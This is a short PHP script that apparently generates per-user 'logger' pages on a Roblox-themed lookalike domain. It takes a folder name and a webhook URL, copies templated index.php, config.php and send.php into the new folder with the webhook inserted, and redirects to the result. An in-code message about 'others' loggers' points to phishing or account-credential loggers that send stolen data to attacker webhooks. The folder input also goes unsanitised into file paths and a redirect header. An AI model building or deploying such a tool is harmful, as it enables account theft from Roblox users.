<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dir = $_POST['folder'];
    if(!is_dir($dir)){
        mkdir($dir);
    } else {
    	die('Please don\'t try overwriting others\' loggers!');
    }
    fwrite(fopen($dir.'/index.php', "w"), str_replace("{folder}", $_POST['folder'], file_get_contents("index.php")));
    fwrite(fopen($dir.'/config.php', "w"), str_replace("{whook}", $_POST['webhook'], file_get_contents("config.php")));
    fwrite(fopen($dir.'/send.php', "w"), file_get_contents("send.php"));
    header("location: http://robloxavatar.xyz/coinflips/$dir");

}
?> 